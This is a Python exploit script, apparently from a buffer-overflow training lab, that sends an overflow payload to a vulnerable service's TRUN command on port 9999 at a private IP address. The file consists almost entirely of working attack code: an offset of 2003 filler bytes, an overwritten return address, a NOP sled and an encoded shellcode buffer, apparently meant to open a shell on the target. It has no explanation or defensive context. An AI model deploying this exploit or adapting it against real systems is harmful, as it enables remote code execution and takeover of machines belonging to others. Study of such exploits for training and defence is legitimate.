#!/bin/python3

import os
import sys
import socket
import termcolor
import threading

rhost = "192.168.37.137";
rport = 9999;

buf =  b""
buf += b"\xb8\xb2\x84\xaf\x87\xd9\xc0\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e\x03\xf0\x8a\x4d"
buf += b"\x72\x08\x7a\x13\x7d\xf0\x7b\x74\xf7\x15\x4a\xb4\x63"
buf += b"\x5e\xfd\x04\xe7\x32\xf2\xef\xa5\xa6\x81\x82\x61\xc9"
buf += b"\x22\x28\x54\xe4\xb3\x01\xa4\x67\x30\x58\xf9\x47\x09"
buf += b"\x93\x0c\x86\x4e\xce\xfd\xda\x07\x84\x50\xca\x2c\xd0"
buf += b"\x68\x61\x7e\xf4\xe8\x96\x37\xf7\xd9\x09\x43\xae\xf9"
buf += b"\xa8\x80\xda\xb3\xb2\xc5\xe7\x0a\x49\x3d\x93\x8c\x9b"
buf += b"\x0f\x5c\x22\xe2\xbf\xaf\x3a\x23\x07\x50\x49\x5d\x7b"
buf += b"\xed\x4a\x9a\x01\x29\xde\x38\xa1\xba\x78\xe4\x53\x6e"
buf += b"\x1e\x6f\x5f\xdb\x54\x37\x7c\xda\xb9\x4c\x78\x57\x3c"
buf += b"\x82\x08\x23\x1b\x06\x50\xf7\x02\x1f\x3c\x56\x3a\x7f"
buf += b"\x9f\x07\x9e\xf4\x32\x53\x93\x57\x5b\x90\x9e\x67\x9b"
buf += b"\xbe\xa9\x14\xa9\x61\x02\xb2\x81\xea\x8c\x45\xe5\xc0"
buf += b"\x69\xd9\x18\xeb\x89\xf0\xde\xbf\xd9\x6a\xf6\xbf\xb1"
buf += b"\x6a\xf7\x15\x15\x3a\x57\xc6\xd6\xea\x17\xb6\xbe\xe0"
buf += b"\x97\xe9\xdf\x0b\x72\x82\x4a\xf6\x15\x6d\x22\xdd\x61"
buf += b"\x05\x31\x1d\x7b\x8a\xbc\xfb\x11\x22\xe9\x54\x8e\xdb"
buf += b"\xb0\x2e\x2f\x23\x6f\x4b\x6f\xaf\x9c\xac\x3e\x58\xe8"
buf += b"\xbe\xd7\xa8\xa7\x9c\x7e\xb6\x1d\x88\x1d\x25\xfa\x48"
buf += b"\x6b\x56\x55\x1f\x3c\xa8\xac\xf5\xd0\x93\x06\xeb\x28"
buf += b"\x45\x60\xaf\xf6\xb6\x6f\x2e\x7a\x82\x4b\x20\x42\x0b"
buf += b"\xd0\x14\x1a\x5a\x8e\xc2\xdc\x34\x60\xbc\xb6\xeb\x2a"
buf += b"\x28\x4e\xc0\xec\x2e\x4f\x0d\x9b\xce\xfe\xf8\xda\xf1"
buf += b"\xcf\x6c\xeb\x8a\x2d\x0d\x14\x41\xf6\x3d\x5f\xcb\x5f"
buf += b"\xd6\x06\x9e\xdd\xbb\xb8\x75\x21\xc2\x3a\x7f\xda\x31"
buf += b"\x22\x0a\xdf\x7e\xe4\xe7\xad\xef\x81\x07\x01\x0f\x80"

shell_code = b"TRUN /.:/" + b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + buf;

def printColoerd(text="", color="white", colored_text="[*]"):
    print(f"{termcolor.colored(colored_text, color)} {text}");

def main():
    printColoerd("Starting...\n", "green");

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        s.connect((rhost, rport));

        printColoerd("Sending exploit\n", "red");
        s.send((shell_code));

        s.close();
        printColoerd("Exploit was sent", "green");
    except:
        printColoerd("Error connecting to server", "red");
        sys.exit();

if(__name__ == "__main__"):
    main();